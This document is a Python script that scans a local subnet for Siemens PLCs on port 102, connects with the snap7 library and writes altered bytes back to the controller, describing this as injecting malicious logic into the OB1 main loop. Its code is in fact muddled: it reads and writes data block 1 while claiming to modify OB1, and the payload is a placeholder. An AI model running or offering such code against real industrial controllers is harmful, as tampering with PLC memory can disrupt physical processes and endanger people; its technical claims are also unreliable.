import snap7
import socket

def find_plc_ip(subnet="192.168.1."):
    """ Scan the network to locate the Siemens PLC's IP address. """
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            s.connect((ip, 102))
            s.close()
            print(f"Potential Siemens PLC found at: {ip}")
            return ip
        except (socket.timeout, ConnectionRefusedError):
            continue
    print("No PLC found on the network.")
    return None

def connect_to_plc(ip):
    """ Establish a connection to the Siemens PLC. """
    plc = snap7.client.Client()
    try:
        plc.connect(ip, 0, 1)
        if plc.get_connected():
            print(f"Connected to PLC at {ip}")
            return plc
    except Exception as e:
        print(f"Failed to connect to PLC: {e}")
    return None

def modify_tasking(plc):
    """
    Inject code by modifying the OB1 block (the main execution loop).
    A real exploit could upload a malicious block or modify OB1 directly.
    """
    try:
        # Read existing OB1 data
        ob1_data = plc.db_read(1, 0, 256)  # Example size, may need adjustment

        # Inject malicious logic (this is a placeholder, actual payload required)
        ob1_data = bytearray(ob1_data)
        ob1_data[-1] = 0x42  # Example modification; actual code injection varies

        # Write back the modified OB1 block to the PLC
        plc.db_write(1, 0, ob1_data)
        
        print("OB1 modified successfully. Execution flow altered.")
    except Exception as e:
        print(f"Error modifying OB1: {e}")

def main():
    plc_ip = find_plc_ip()
    if not plc_ip:
        return

    plc = connect_to_plc(plc_ip)
    if not plc:
        return

    modify_tasking(plc)
    plc.disconnect()
    print("PLC task modification complete.")

if __name__ == "__main__":
    main()